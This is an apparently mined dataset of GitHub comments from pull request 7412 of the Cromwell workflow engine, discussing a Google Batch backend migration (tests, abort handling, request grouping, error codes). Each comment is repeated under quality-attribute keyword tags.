https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874:217,Energy Efficiency,reduce,reduce,217,"Thanks for reviewing this, so far I don't expect considerable code changes to be made. I have saw that you approved a few other PRs, it could be a good idea to wait for them to get merged before reviewing this one to reduce the diff. > 1. -e is for exclude. There is a papi_v2beta_gcsa.test that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one). I have not familiarized myself yet with Centaur which is why I preferred asking. > 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid. I was thinking that there could be a wrong setup, perhaps running the wrong tests which would explain why code with tests was marked with no coverage, still, I have the impression that the behavior improved since #7418 was merged. > 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in StandardAsyncExecutionActor#requestsAbortAndDiesImmediately, it does seem like we may want the false behavior because it's responsible for some finalization activities around the job. Agree, do you have any insights on how can I possibly test this to save some research time?. > 4.. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination). Yes, they are quite a lot but we were testing different parameters and found this behavior, still, it seems worth to leave this for another PR. > 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states. Great.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874:409,Modifiability,config,configuration,409,"Thanks for reviewing this, so far I don't expect considerable code changes to be made. I have saw that you approved a few other PRs, it could be a good idea to wait for them to get merged before reviewing this one to reduce the diff. > 1. -e is for exclude. There is a papi_v2beta_gcsa.test that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one). I have not familiarized myself yet with Centaur which is why I preferred asking. > 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid. I was thinking that there could be a wrong setup, perhaps running the wrong tests which would explain why code with tests was marked with no coverage, still, I have the impression that the behavior improved since #7418 was merged. > 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in StandardAsyncExecutionActor#requestsAbortAndDiesImmediately, it does seem like we may want the false behavior because it's responsible for some finalization activities around the job. Agree, do you have any insights on how can I possibly test this to save some research time?. > 4.. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination). Yes, they are quite a lot but we were testing different parameters and found this behavior, still, it seems worth to leave this for another PR. > 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states. Great.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874:286,Testability,test,test,286,"Thanks for reviewing this, so far I don't expect considerable code changes to be made. I have saw that you approved a few other PRs, it could be a good idea to wait for them to get merged before reviewing this one to reduce the diff. > 1. -e is for exclude. There is a papi_v2beta_gcsa.test that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one). I have not familiarized myself yet with Centaur which is why I preferred asking. > 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid. I was thinking that there could be a wrong setup, perhaps running the wrong tests which would explain why code with tests was marked with no coverage, still, I have the impression that the behavior improved since #7418 was merged. > 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in StandardAsyncExecutionActor#requestsAbortAndDiesImmediately, it does seem like we may want the false behavior because it's responsible for some finalization activities around the job. Agree, do you have any insights on how can I possibly test this to save some research time?. > 4.. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination). Yes, they are quite a lot but we were testing different parameters and found this behavior, still, it seems worth to leave this for another PR. > 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states. Great.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874:382,Testability,test,test,382,"Thanks for reviewing this, so far I don't expect considerable code changes to be made. I have saw that you approved a few other PRs, it could be a good idea to wait for them to get merged before reviewing this one to reduce the diff. > 1. -e is for exclude. There is a papi_v2beta_gcsa.test that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one). I have not familiarized myself yet with Centaur which is why I preferred asking. > 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid. I was thinking that there could be a wrong setup, perhaps running the wrong tests which would explain why code with tests was marked with no coverage, still, I have the impression that the behavior improved since #7418 was merged. > 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in StandardAsyncExecutionActor#requestsAbortAndDiesImmediately, it does seem like we may want the false behavior because it's responsible for some finalization activities around the job. Agree, do you have any insights on how can I possibly test this to save some research time?. > 4.. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination). Yes, they are quite a lot but we were testing different parameters and found this behavior, still, it seems worth to leave this for another PR. > 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states. Great.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874:640,Testability,test,tests,640,"Thanks for reviewing this, so far I don't expect considerable code changes to be made. I have saw that you approved a few other PRs, it could be a good idea to wait for them to get merged before reviewing this one to reduce the diff. > 1. -e is for exclude. There is a papi_v2beta_gcsa.test that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one). I have not familiarized myself yet with Centaur which is why I preferred asking. > 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid. I was thinking that there could be a wrong setup, perhaps running the wrong tests which would explain why code with tests was marked with no coverage, still, I have the impression that the behavior improved since #7418 was merged. > 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in StandardAsyncExecutionActor#requestsAbortAndDiesImmediately, it does seem like we may want the false behavior because it's responsible for some finalization activities around the job. Agree, do you have any insights on how can I possibly test this to save some research time?. > 4.. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination). Yes, they are quite a lot but we were testing different parameters and found this behavior, still, it seems worth to leave this for another PR. > 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states. Great.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874:748,Testability,test,tests,748,"Thanks for reviewing this, so far I don't expect considerable code changes to be made. I have saw that you approved a few other PRs, it could be a good idea to wait for them to get merged before reviewing this one to reduce the diff. > 1. -e is for exclude. There is a papi_v2beta_gcsa.test that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one). I have not familiarized myself yet with Centaur which is why I preferred asking. > 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid. I was thinking that there could be a wrong setup, perhaps running the wrong tests which would explain why code with tests was marked with no coverage, still, I have the impression that the behavior improved since #7418 was merged. > 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in StandardAsyncExecutionActor#requestsAbortAndDiesImmediately, it does seem like we may want the false behavior because it's responsible for some finalization activities around the job. Agree, do you have any insights on how can I possibly test this to save some research time?. > 4.. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination). Yes, they are quite a lot but we were testing different parameters and found this behavior, still, it seems worth to leave this for another PR. > 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states. Great.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874:788,Testability,test,tests,788,"Thanks for reviewing this, so far I don't expect considerable code changes to be made. I have saw that you approved a few other PRs, it could be a good idea to wait for them to get merged before reviewing this one to reduce the diff. > 1. -e is for exclude. There is a papi_v2beta_gcsa.test that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one). I have not familiarized myself yet with Centaur which is why I preferred asking. > 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid. I was thinking that there could be a wrong setup, perhaps running the wrong tests which would explain why code with tests was marked with no coverage, still, I have the impression that the behavior improved since #7418 was merged. > 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in StandardAsyncExecutionActor#requestsAbortAndDiesImmediately, it does seem like we may want the false behavior because it's responsible for some finalization activities around the job. Agree, do you have any insights on how can I possibly test this to save some research time?. > 4.. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination). Yes, they are quite a lot but we were testing different parameters and found this behavior, still, it seems worth to leave this for another PR. > 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states. Great.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874:960,Testability,test,test,960,"Thanks for reviewing this, so far I don't expect considerable code changes to be made. I have saw that you approved a few other PRs, it could be a good idea to wait for them to get merged before reviewing this one to reduce the diff. > 1. -e is for exclude. There is a papi_v2beta_gcsa.test that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one). I have not familiarized myself yet with Centaur which is why I preferred asking. > 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid. I was thinking that there could be a wrong setup, perhaps running the wrong tests which would explain why code with tests was marked with no coverage, still, I have the impression that the behavior improved since #7418 was merged. > 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in StandardAsyncExecutionActor#requestsAbortAndDiesImmediately, it does seem like we may want the false behavior because it's responsible for some finalization activities around the job. Agree, do you have any insights on how can I possibly test this to save some research time?. > 4.. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination). Yes, they are quite a lot but we were testing different parameters and found this behavior, still, it seems worth to leave this for another PR. > 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states. Great.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874:1258,Testability,test,test,1258,"Thanks for reviewing this, so far I don't expect considerable code changes to be made. I have saw that you approved a few other PRs, it could be a good idea to wait for them to get merged before reviewing this one to reduce the diff. > 1. -e is for exclude. There is a papi_v2beta_gcsa.test that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one). I have not familiarized myself yet with Centaur which is why I preferred asking. > 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid. I was thinking that there could be a wrong setup, perhaps running the wrong tests which would explain why code with tests was marked with no coverage, still, I have the impression that the behavior improved since #7418 was merged. > 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in StandardAsyncExecutionActor#requestsAbortAndDiesImmediately, it does seem like we may want the false behavior because it's responsible for some finalization activities around the job. Agree, do you have any insights on how can I possibly test this to save some research time?. > 4.. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination). Yes, they are quite a lot but we were testing different parameters and found this behavior, still, it seems worth to leave this for another PR. > 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states. Great.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874:1590,Testability,test,testing,1590,"Thanks for reviewing this, so far I don't expect considerable code changes to be made. I have saw that you approved a few other PRs, it could be a good idea to wait for them to get merged before reviewing this one to reduce the diff. > 1. -e is for exclude. There is a papi_v2beta_gcsa.test that should be running under Batch still. I believe the Beta version is a fairly essential test because it checks the configuration Terra uses for auth (though I'm not 100% sure on this one). I have not familiarized myself yet with Centaur which is why I preferred asking. > 2. We use Codecov as an advisory thing, if the human developers think the tests are solid, they're solid. I was thinking that there could be a wrong setup, perhaps running the wrong tests which would explain why code with tests was marked with no coverage, still, I have the impression that the behavior improved since #7418 was merged. > 3. I think I'd need to know more detail about what the test checks for and how it fails. Looking at the comment in StandardAsyncExecutionActor#requestsAbortAndDiesImmediately, it does seem like we may want the false behavior because it's responsible for some finalization activities around the job. Agree, do you have any insights on how can I possibly test this to save some research time?. > 4.. 100 workers seems like a lot? I think our default for PAPI is 3, and we stick to that default in Terra. Is the Batch behavior radically different, motivating 100? I totally agree that the formula could use re-evaluation (or maybe even elimination). Yes, they are quite a lot but we were testing different parameters and found this behavior, still, it seems worth to leave this for another PR. > 5. That seems fine. So long as we have some kind of handling for every case in com.google.cloud.batch.v1.JobStatus.State` we should be good. The execution events are designed to be tied closely to the implementation of the backend with minimal translation or invention of new states. Great.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110742874
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110816623:165,Testability,test,test,165,"Sounds good, yeah, that was the strategy I was thinking of, merging smallest-to-largest. 3. I can definitely check it out if you let me know the name of the failing test, otherwise not really sure where to start.; 4. Seems reasonable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2110816623
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111138038:166,Availability,failure,failures,166,"> 3. I can definitely check it out if you let me know the name of the failing test, otherwise not really sure where to start. I have toggled the flag to get the test failures: https://github.com/broadinstitute/cromwell/actions/runs/9085118759/job/24967675053?pr=7412. Thanks for the help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111138038
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111138038:133,Deployability,toggle,toggled,133,"> 3. I can definitely check it out if you let me know the name of the failing test, otherwise not really sure where to start. I have toggled the flag to get the test failures: https://github.com/broadinstitute/cromwell/actions/runs/9085118759/job/24967675053?pr=7412. Thanks for the help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111138038
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111138038:78,Testability,test,test,78,"> 3. I can definitely check it out if you let me know the name of the failing test, otherwise not really sure where to start. I have toggled the flag to get the test failures: https://github.com/broadinstitute/cromwell/actions/runs/9085118759/job/24967675053?pr=7412. Thanks for the help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111138038
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111138038:161,Testability,test,test,161,"> 3. I can definitely check it out if you let me know the name of the failing test, otherwise not really sure where to start. I have toggled the flag to get the test failures: https://github.com/broadinstitute/cromwell/actions/runs/9085118759/job/24967675053?pr=7412. Thanks for the help.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111138038
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466:89,Availability,failure,failure,89,"Nice, OK, so the test is `should abort a workflow mid run abort.scheduled_abort` and the failure is `expected: ""Aborted"" but got: ""Failed""`. So it seems like `true` makes an actual abort happen as expected, as opposed to an abort that somehow looks like a failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466:256,Availability,failure,failure,256,"Nice, OK, so the test is `should abort a workflow mid run abort.scheduled_abort` and the failure is `expected: ""Aborted"" but got: ""Failed""`. So it seems like `true` makes an actual abort happen as expected, as opposed to an abort that somehow looks like a failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466:33,Safety,abort,abort,33,"Nice, OK, so the test is `should abort a workflow mid run abort.scheduled_abort` and the failure is `expected: ""Aborted"" but got: ""Failed""`. So it seems like `true` makes an actual abort happen as expected, as opposed to an abort that somehow looks like a failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466:58,Safety,abort,abort,58,"Nice, OK, so the test is `should abort a workflow mid run abort.scheduled_abort` and the failure is `expected: ""Aborted"" but got: ""Failed""`. So it seems like `true` makes an actual abort happen as expected, as opposed to an abort that somehow looks like a failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466:112,Safety,Abort,Aborted,112,"Nice, OK, so the test is `should abort a workflow mid run abort.scheduled_abort` and the failure is `expected: ""Aborted"" but got: ""Failed""`. So it seems like `true` makes an actual abort happen as expected, as opposed to an abort that somehow looks like a failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466:181,Safety,abort,abort,181,"Nice, OK, so the test is `should abort a workflow mid run abort.scheduled_abort` and the failure is `expected: ""Aborted"" but got: ""Failed""`. So it seems like `true` makes an actual abort happen as expected, as opposed to an abort that somehow looks like a failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466:224,Safety,abort,abort,224,"Nice, OK, so the test is `should abort a workflow mid run abort.scheduled_abort` and the failure is `expected: ""Aborted"" but got: ""Failed""`. So it seems like `true` makes an actual abort happen as expected, as opposed to an abort that somehow looks like a failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466:17,Testability,test,test,17,"Nice, OK, so the test is `should abort a workflow mid run abort.scheduled_abort` and the failure is `expected: ""Aborted"" but got: ""Failed""`. So it seems like `true` makes an actual abort happen as expected, as opposed to an abort that somehow looks like a failure.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2111156466
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2114687293:66,Testability,test,tests,66,"I have resolved the problems, it is also worth to execute the new tests from #7440.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2114687293
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2115768826:19,Availability,down,down,19,"I need to put this down for the moment to finish https://github.com/broadinstitute/cromwell/pull/7439 which is currently affecting users, hope to get back to it tomorrow morning.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2115768826
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2122548119:171,Safety,abort,aborted,171,"Good news, I was able to fix `StandardAsyncExecutionActor#requestsAbortAndDiesImmediately=false`. Turns out that when this flag is true, Cromwell blindly marks the job as aborted, now, Cromwell waits until the abort request is executed and the job can't be retrieved from GCP anymore.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2122548119
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2122548119:210,Safety,abort,abort,210,"Good news, I was able to fix `StandardAsyncExecutionActor#requestsAbortAndDiesImmediately=false`. Turns out that when this flag is true, Cromwell blindly marks the job as aborted, now, Cromwell waits until the abort request is executed and the job can't be retrieved from GCP anymore.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2122548119
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709:910,Availability,Error,Error,910,"Due to the activity noise, the comments are hidden, I'll post here for better visibility. > Request grouping. Originally, this was created because we hoped that Google had an alternative to Batch requests, by now, Google has confirmed that there is no way to do that. These are some notes from our internal discussions:; 1. The code becomes way simpler if this grouping gets removed.; 2. We have not checked the potential implications on creating a batch client for every request, or, reusing the same client for the application's lifecycle.; 3. Grouping requests could allow us to eventually implement streaming like fs2/akka-stream, which could allow us to throttle the requests, still, if Cromwell already does this in another layer, this becomes unnecessary. Given that the current code has been tested so many times, my suggestion is to keep the grouping and potentially remove it in another iteration. > Error codes. Google has confirmed that there are more error codes than what the grpc response provides, still, these can be found at the job events, hence, they need to be parsed from the strings (PAPI does something similar). But, this has not been done in this PR which is why I have removed a lot of code that is not necessary. In a following PR, we should implement part of this in order to handle preemption errors. See https://cloud.google.com/batch/docs/troubleshooting#reserved-exit-codes. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709:964,Availability,error,error,964,"Due to the activity noise, the comments are hidden, I'll post here for better visibility. > Request grouping. Originally, this was created because we hoped that Google had an alternative to Batch requests, by now, Google has confirmed that there is no way to do that. These are some notes from our internal discussions:; 1. The code becomes way simpler if this grouping gets removed.; 2. We have not checked the potential implications on creating a batch client for every request, or, reusing the same client for the application's lifecycle.; 3. Grouping requests could allow us to eventually implement streaming like fs2/akka-stream, which could allow us to throttle the requests, still, if Cromwell already does this in another layer, this becomes unnecessary. Given that the current code has been tested so many times, my suggestion is to keep the grouping and potentially remove it in another iteration. > Error codes. Google has confirmed that there are more error codes than what the grpc response provides, still, these can be found at the job events, hence, they need to be parsed from the strings (PAPI does something similar). But, this has not been done in this PR which is why I have removed a lot of code that is not necessary. In a following PR, we should implement part of this in order to handle preemption errors. See https://cloud.google.com/batch/docs/troubleshooting#reserved-exit-codes. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709:1323,Availability,error,errors,1323,"Due to the activity noise, the comments are hidden, I'll post here for better visibility. > Request grouping. Originally, this was created because we hoped that Google had an alternative to Batch requests, by now, Google has confirmed that there is no way to do that. These are some notes from our internal discussions:; 1. The code becomes way simpler if this grouping gets removed.; 2. We have not checked the potential implications on creating a batch client for every request, or, reusing the same client for the application's lifecycle.; 3. Grouping requests could allow us to eventually implement streaming like fs2/akka-stream, which could allow us to throttle the requests, still, if Cromwell already does this in another layer, this becomes unnecessary. Given that the current code has been tested so many times, my suggestion is to keep the grouping and potentially remove it in another iteration. > Error codes. Google has confirmed that there are more error codes than what the grpc response provides, still, these can be found at the job events, hence, they need to be parsed from the strings (PAPI does something similar). But, this has not been done in this PR which is why I have removed a lot of code that is not necessary. In a following PR, we should implement part of this in order to handle preemption errors. See https://cloud.google.com/batch/docs/troubleshooting#reserved-exit-codes. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709:659,Performance,throttle,throttle,659,"Due to the activity noise, the comments are hidden, I'll post here for better visibility. > Request grouping. Originally, this was created because we hoped that Google had an alternative to Batch requests, by now, Google has confirmed that there is no way to do that. These are some notes from our internal discussions:; 1. The code becomes way simpler if this grouping gets removed.; 2. We have not checked the potential implications on creating a batch client for every request, or, reusing the same client for the application's lifecycle.; 3. Grouping requests could allow us to eventually implement streaming like fs2/akka-stream, which could allow us to throttle the requests, still, if Cromwell already does this in another layer, this becomes unnecessary. Given that the current code has been tested so many times, my suggestion is to keep the grouping and potentially remove it in another iteration. > Error codes. Google has confirmed that there are more error codes than what the grpc response provides, still, these can be found at the job events, hence, they need to be parsed from the strings (PAPI does something similar). But, this has not been done in this PR which is why I have removed a lot of code that is not necessary. In a following PR, we should implement part of this in order to handle preemption errors. See https://cloud.google.com/batch/docs/troubleshooting#reserved-exit-codes. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709:800,Testability,test,tested,800,"Due to the activity noise, the comments are hidden, I'll post here for better visibility. > Request grouping. Originally, this was created because we hoped that Google had an alternative to Batch requests, by now, Google has confirmed that there is no way to do that. These are some notes from our internal discussions:; 1. The code becomes way simpler if this grouping gets removed.; 2. We have not checked the potential implications on creating a batch client for every request, or, reusing the same client for the application's lifecycle.; 3. Grouping requests could allow us to eventually implement streaming like fs2/akka-stream, which could allow us to throttle the requests, still, if Cromwell already does this in another layer, this becomes unnecessary. Given that the current code has been tested so many times, my suggestion is to keep the grouping and potentially remove it in another iteration. > Error codes. Google has confirmed that there are more error codes than what the grpc response provides, still, these can be found at the job events, hence, they need to be parsed from the strings (PAPI does something similar). But, this has not been done in this PR which is why I have removed a lot of code that is not necessary. In a following PR, we should implement part of this in order to handle preemption errors. See https://cloud.google.com/batch/docs/troubleshooting#reserved-exit-codes. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709
https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709:345,Usability,simpl,simpler,345,"Due to the activity noise, the comments are hidden, I'll post here for better visibility. > Request grouping. Originally, this was created because we hoped that Google had an alternative to Batch requests, by now, Google has confirmed that there is no way to do that. These are some notes from our internal discussions:; 1. The code becomes way simpler if this grouping gets removed.; 2. We have not checked the potential implications on creating a batch client for every request, or, reusing the same client for the application's lifecycle.; 3. Grouping requests could allow us to eventually implement streaming like fs2/akka-stream, which could allow us to throttle the requests, still, if Cromwell already does this in another layer, this becomes unnecessary. Given that the current code has been tested so many times, my suggestion is to keep the grouping and potentially remove it in another iteration. > Error codes. Google has confirmed that there are more error codes than what the grpc response provides, still, these can be found at the job events, hence, they need to be parsed from the strings (PAPI does something similar). But, this has not been done in this PR which is why I have removed a lot of code that is not necessary. In a following PR, we should implement part of this in order to handle preemption errors. See 